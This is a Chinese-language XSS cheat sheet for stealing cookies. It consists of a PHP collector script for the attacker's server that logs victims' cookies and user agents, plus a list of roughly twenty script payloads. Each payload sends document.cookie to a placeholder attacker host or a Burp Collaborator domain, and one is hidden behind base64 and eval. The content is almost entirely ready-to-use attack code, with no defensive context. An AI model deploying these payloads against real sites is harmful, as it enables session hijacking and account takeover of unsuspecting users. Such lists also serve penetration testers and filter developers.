# XSS漏洞

## 1.窃取cookie

攻击者主机colector.php
```php
<?php
  $cookie = $_GET['cookie'];
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  $file = fopen('colector.txt', 'a');
  fwrite($file,"USER AGENT:$useragent\r\nCOOKIE=$cookie\r\n");
  fclose($file);
?>
```

赋予权限
```bash
chmod 755 colector.php
```

payload：
```javascript
<script>document.location='http://攻击者主机地址/colector.php?cookie='+document.cookie</script>
```

其它触发方式：
```javascript
<img src=x onerror=this.src="http://攻击者主机地址/?c="+document.cookie>
<img src=x onerror="location.href='http://攻击者主机地址/?c='+ document.cookie">
<script>new Image().src="http://攻击者主机地址/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://攻击者主机地址/?c="+escape(document.cookie);</script>
<script>location.href = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://攻击者主机地址?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://攻击者主机地址?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://攻击者主机地址/?c="+document.cookie</script>
<script>window.location="https://攻击者主机地址/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://攻击者主机地址/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovL+aUu+WHu+iAheS4u+acuuWcsOWdgD9jPSIrIGRvY3VtZW50LmNvb2tpZSArIicgLz4iKQ=='));</script>
<script>fetch('https://子域名.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://攻击者主机地址/',document.cookie)</script>
```
